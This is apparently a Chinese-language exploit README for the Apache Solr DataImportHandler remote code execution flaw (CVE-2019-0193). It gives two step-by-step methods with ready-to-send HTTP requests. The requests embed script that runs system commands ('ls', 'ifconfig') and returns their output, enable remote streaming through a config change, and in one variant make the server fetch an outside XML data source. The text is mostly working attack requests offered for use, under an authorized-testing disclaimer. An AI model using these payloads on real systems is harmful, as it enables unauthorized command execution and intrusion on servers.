### 声明

此处提供的漏洞检测方法、文件等内容，均仅限于安全从业者在获得法律授权的情况下使用，目的是检测已授权的服务器的安全性。安全从业者务必遵守法律规定，禁止在没有得到授权的情况下做任何漏洞检测。

### 简介

[漏洞分析 - Apache Solr远程代码执行漏洞(CVE-2019-0193) - 先知社区](https://xz.aliyun.com/t/5965)

理论上可以使用各种不同类型的数据源来构造Exploit

Exploit1使用数据源的类型为`URLDataSource`

Exploit2使用的数据源类型为 `ContentStreamDataSource`


### 检测漏洞 - Exploit1

Exploit1使用数据源的类型为`URLDataSource`

优点：结果回显 支持对Solr低版本的检测

缺点：需要出网


#### 步骤1

构造`URLDataSource`类型的数据源(Solr服务器会去访问该数据源!) 可以直接使用这个

https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml

文档`demo.xml`  即`URLDataSource`类型的数据源  一份无害的正常XML文档

文档中只有一个`item`元素 以便实现只执行1次命令


也可以自己启动web服务器托管文档`demo.xml`  命令 `live-server --port=5555`   得到地址 `http://127.0.0.1:5555/demo.xml`

#### 步骤2

获取Solr中所有索引库(core)的名称

```
http://{xx.com:80}/solr/admin/cores

HTTP响应 JSON数据 会有所有索引库(core)的名称

"name":"xxxx"
```

#### 步骤3

判断该索引库是否使用了DataImportHandler模块

方法1
```
访问
http://{xx.com:80}/solr/{core_name}/admin/mbeans?cat=QUERY&wt=json

如果使用了DataImportHandler模块 则HTTP响应内会有:
org.apache.solr.handler.dataimport.DataImportHandler

否则说明没有使用DataImportHandler模块(不受该漏洞影响)
```

方法2
```
访问
http://{xx.com:80}/solr/#/{core_name}/dataimport

如果这个Solr服务器并没有使用dataimport-handler模块(不受该漏洞影响)，HTTP响应中会有提示：
sorry, no dataimport-handler defined!

否则说明使用了DataImportHandler模块(受该漏洞影响)
```

#### 步骤4 构造HTTP请求

执行命令 HTTP响应中有执行结果回显 支持多行结果 (我写的是每一行用`\n\r`结尾)

注意：需要将以下请求url中的字符串"tika"替换为索引库的名称

```
POST /solr/tika/dataimport HTTP/1.1
Host: solr.com:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://solr.com:8983/solr/
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 1231
Connection: close

command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=
<dataConfig>


  <dataSource type="URLDataSource"/>
  <script><![CDATA[

          function poc(row){

 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ls").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\n\r"));

return row;

}


  ]]></script>

        <document>
             <entity name="entity1"
                     url="https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml"
                     processor="XPathEntityProcessor"
                     forEach="/RDF/item"
                     transformer="script:poc">
                        <field column="title" xpath="/RDF/item/title" />
             </entity>
        </document>
</dataConfig>
```


### 检测漏洞 - Exploit2

Exploit2使用的数据源类型为 `ContentStreamDataSource`

优点:结果回显 无需出网

缺点:对低版本无法检测 - 因为通过POST请求修改`configoverlay.json`文件中的配置会失败

#### 步骤1-3

步骤1省略

步骤2-3 同上

#### 步骤4

该步骤是为了修改`configoverlay.json`文件中的配置 以启用远程流的相关选项 `.enableStreamBody` `.enableRemoteStreaming`

替换`tika`为索引库名称

```
POST /solr/tika/config HTTP/1.1
Host: 127.0.0.1
Accept: */*
Content-type:application/json
Content-Length: 159
Connection: close

{"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": true}, "set-property": {"requestDispatcher.requestParsers.enableStreamBody": true}}
```

响应200即成功(实际测试 8.1可以成功)

响应500即失败(实际测试 某些低版本会失败)

#### 步骤5

发送请求 执行系统命令`ifconfig` 并得到回显 (全程无外连 不出网)

```
POST /solr/tika/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%66%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
Host: solr.com:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://solr.com:8983/solr/
Content-Length: 212
content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f


--------------------------aceb88c2159f183f
Content-Disposition: form-data; name="stream.body"

<?xml version="1.0" encoding="UTF-8"?>
<RDF>
<item/>
</RDF>

--------------------------aceb88c2159f183f--

```



注意，其中dataConfig的值，URLencode之前为以下字符串
```

<dataConfig>
<dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />

  <script><![CDATA[
          function poc(row){
 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ifconfig").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\n\r"));
return row;

}

]]></script>

<document>
    <entity
        stream="true"
        name="entity1"
        datasource="streamsrc1"
        processor="XPathEntityProcessor"
        rootEntity="true"
        forEach="/RDF/item"
        transformer="script:poc">
             <field column="title" xpath="/RDF/item/title" />
    </entity>
</document>
</dataConfig>
```
